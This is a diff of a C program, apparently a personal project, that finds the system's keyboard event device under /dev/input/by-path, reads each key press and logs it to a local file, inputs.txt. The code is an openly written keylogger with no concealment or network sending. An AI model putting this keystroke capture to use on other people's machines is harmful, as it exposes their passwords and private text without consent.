@@ -1,43 +1,125 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <stdbool.h>
 #include <fcntl.h>
 #include <linux/input.h>
+
+#include <dirent.h>
+#include <string.h>
+#include <linux/limits.h>
+
 #include "local_events.h"
 
+int main(int argc, char *argv[])
+{
+    char kbd_path[PATH_MAX] = {0};
+    DIR *dir = opendir("/dev/input/by-path");
+    if (dir == NULL)
+    {
+        perror("ERROR OPENING DIR: ");
+        return EXIT_FAILURE;
+    }
+
+    struct dirent *entry;
+    while((entry = readdir(dir)) != NULL ) {
+        if(strstr(entry->d_name,  "event-kbd")) {
+        snprintf(kbd_path, sizeof(kbd_path),
+                        "/dev/input/by-path/%s", entry->d_name);
+                break;
+        }
+    }
+
+    closedir(dir);
+    if(kbd_path[0] == '\0') {
+        perror("EVENT FILE NOT FOUND.");
+        return EXIT_FAILURE;
+    }
+
+    printf("file found %s\n", kbd_path);
+
+    FILE *dest_file = fopen("inputs.txt", "w");
+    if (dest_file == NULL)
+    {
+        perror("ERROR OPEING FILE ");
+        return EXIT_FAILURE;
+    }
+
+    const char *filename = kbd_path;
+    int fp = open(kbd_path, O_RDONLY);
+
+    if (fp < 0)
+    {
+        printf("Failed to open file discriptor : %s : %d\n", filename, fp);
+        perror("ERROR: ");
+        return EXIT_FAILURE;
+    }
+
+    struct input_event ev;
+    int running = true;
+    while (running)
+    {
+        read(fp, &ev, sizeof ev);
+        if (ev.type != EV_KEY)
+        {
+            continue;
+        }
+        if (ev.value != 1)
+            continue;
+        char code[20] = {0};
+        get_keyboard_codes(&ev, code);
+        printf("keyboard parsed %s\n", code);
+        fputs(code, dest_file);
+        fflush(dest_file);
+
+        printf("Event: time %ld.%06ld, type %d, code %d, value %d\n",
+               ev.time.tv_sec, ev.time.tv_usec, ev.type, ev.code, ev.value);
+    }
+
+    close(fp);
+    fclose(dest_file);
+
+    return EXIT_SUCCESS;
+}
 
 
 
-int main(int argc, char *argv[]) {
-    if (argc != 2) {
+int main_static(int argc, char *argv[])
+{
+    if (argc != 2)
+    {
         printf("Usage: %s <keyboard-event-file>\n", argv[0]);
         return EXIT_FAILURE;
     }
 
     FILE *dest_file = fopen("inputs.txt", "w");
-    if(dest_file == NULL) {
+    if (dest_file == NULL)
+    {
         perror("ERROR OPEING FILE ");
         return EXIT_FAILURE;
     }
 
-
     const char *filename = argv[1];
-    int fp = open(filename, O_RDONLY );
+    int fp = open(filename, O_RDONLY);
 
-    if(fp < 0) {
+    if (fp < 0)
+    {
         printf("Failed to open file discriptor : %s \n", filename);
         perror("ERROR: ");
         return EXIT_FAILURE;
     }
 
-    struct input_event ev ;
+    struct input_event ev;
     int running = true;
-    while (running) {
+    while (running)
+    {
         read(fp, &ev, sizeof ev);
-        if(ev.type != EV_KEY) {
+        if (ev.type != EV_KEY)
+        {
             continue;
         }
-        if(ev.value !=1 ) continue;
+        if (ev.value != 1)
+            continue;
         char code[20] = {0};
         get_keyboard_codes(&ev, code);
         printf("keyboard parsed %s\n", code);
@@ -51,9 +133,6 @@ int main(int argc, char *argv[]) {
 
     close(fp);
     fclose(dest_file);
-
-
-
 
     return EXIT_SUCCESS;
 }
